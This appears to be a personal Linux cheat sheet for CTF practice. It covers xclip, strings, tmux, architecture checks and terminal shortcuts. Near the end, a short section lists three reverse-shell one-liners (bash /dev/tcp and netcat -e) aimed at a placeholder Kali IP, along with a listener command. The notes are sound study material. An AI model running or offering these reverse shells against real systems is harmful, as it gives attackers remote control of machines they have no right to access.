# Useful commands and tools on Linux

## xclip

### Install

- `sudo apt install xclip`

### Use

xclip is a tool that can allow you to get any output in you clipboard.  
Let's say you have a big input to copy and do not want to mess up with the mouse, you can use xclip.
- `cat myverybigfile | xclip -sel clipboard` will send the content of myverybigfile to the clipboard

## Strings

Strings will print human readable chars of a file. And for a CTF if we are looking for a specific string we can pipe it to grep
- `strings -e l file | grep -i FLAG` the `-e l` will select the encoding l is for 16-bit littleendian
- `strings file` is the basic use of the command

## TMUX

"tmux is a terminal multiplexer. It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal." Learn more about [tmux](https://github.com/tmux/tmux/wiki).

- `tmux new -s sessionName` create an join a new session
- `ctrl+b d` detach a session
- `tmux ls` list existing sessions
- `ctrl+b x` kill current session
- `tmux a -t sessionName` or `tmux a -t sessionId` join an existing session
- `tmux  ctrl+b pageup` to scroll and `q` to leave scroll mode

## Which architecture

- `lscpu` will tell you if you are 32 or 64
- `uname -m` similar but less verbose

## Useful shortcuts to use the terminal quickly

- `Ctrl+U` - clear all the current line from the end to the beginning only if the cursor is at the end of the line.
- `Ctrl+Y` - recall the cleared line 
- `Ctrl+K` - clear all the current line from the beginning to the end only if the cursor is at the beginning of the line.
- `Ctrl+W` - clear the previous word in the current line. For example if you have typed a command like `git diff /path/to/some/file` and you want to delete just the last parameter to the command, Ctrl+W is very useful.
- `Ctrl+E Ctrl+U` - move the cursor to the end of the line and clear all the current line from the end to the beginning.
- `Ctrl+A Ctrl+K` - move the cursor at the beginning of the line and clear all the current line from the beginning to the end.
- `Ctrl+C` - cancel the current command line, which implies clear all the current line no matter where the cursor is. (you can't recall the cleared line anymore).
- `Alt+Shift+#` - comment the current line, keep it in the history and bring up your prompt on a new line.
- `Ctrl+Shit+C` - copy something you previously selected
- `Ctrl+Shit+V` - paste something
- `Home` - Go to the begining of your prompt 
- `End` - Go to the end of your prompt

## Launch shells from a terminal

- Say we have a way through root and we need to get a reverse shell here are helpfuls command
  - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
  - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
  - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
- *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*

## Explainshell.com

- [This website](https://explainshell.com/) is relly helpful to understand what a specific linux command does. Here is an example with `rm -rf file`  
![image](https://user-images.githubusercontent.com/96747355/175054655-9a49193f-38a3-4cc7-92dc-e1d6f716aaab.png)


## Resources

{% embed url="https://askubuntu.com/questions/470966/shortcut-to-clear-command-line-terminal" %} Shortcut to clear command line terminal {% endembed %}
